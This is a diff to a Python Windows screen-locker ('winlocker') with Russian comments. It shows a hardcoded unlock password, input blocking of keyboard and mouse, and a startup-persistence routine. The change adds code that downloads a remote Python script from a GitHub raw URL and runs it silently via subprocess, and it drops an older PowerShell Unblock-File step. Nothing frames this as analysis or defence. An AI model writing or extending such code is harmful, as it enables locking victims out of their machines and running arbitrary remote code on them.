@@ -3,8 +3,10 @@ import ctypes, os, sys, time, threading, random, tempfile, urllib.request, tkint
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-MUSIC_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/music.mp3"
-MUSIC_FILE = os.path.join(tempfile.gettempdir(), "winlocker_music.mp3")
+# Ссылка на генератор MP3-файла в моём репозитории
+MUSIC_GENERATOR_URL = "https://raw.githubusercontent.com/KaliToolsAcademy/music/main/generate_music.py"
+# Путь, куда сохранится твоя музыка
+MUSIC_FILE = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "winlocker_music.mp3")
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -38,14 +40,27 @@ def add_to_startup():
     except:
         pass
 
-# === СКАЧИВАЕМ И ИГРАЕМ МУЗЫКУ ===
+# === ФУНКЦИЯ ДЛЯ ГЕНЕРАЦИИ МУЗЫКИ ===
+def generate_music_file():
+    """Скачивает и запускает генератор, который создаст MP3-файл с твоей музыкой."""
+    try:
+        # Если файла нет, скачиваем генератор
+        generator_path = os.path.join(tempfile.gettempdir(), "generate_music.py")
+        if not os.path.exists(MUSIC_FILE):
+            urllib.request.urlretrieve(MUSIC_GENERATOR_URL, generator_path)
+            # Запускаем генератор
+            import subprocess
+            subprocess.run([sys.executable, generator_path], check=True)
+    except:
+        pass
+
+# === ИГРАЕМ МУЗЫКУ ===
 def play_music():
     try:
+        # Убедимся, что файл существует, если нет — создадим
         if not os.path.exists(MUSIC_FILE):
-            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
-            # Снимаем блокировку Windows
-            os.system('powershell -Command "Unblock-File -Path \'' + MUSIC_FILE + '\'"')
-
+            generate_music_file()
+        
         if os.path.exists(MUSIC_FILE):
             try:
                 import pygame.mixer as mixer
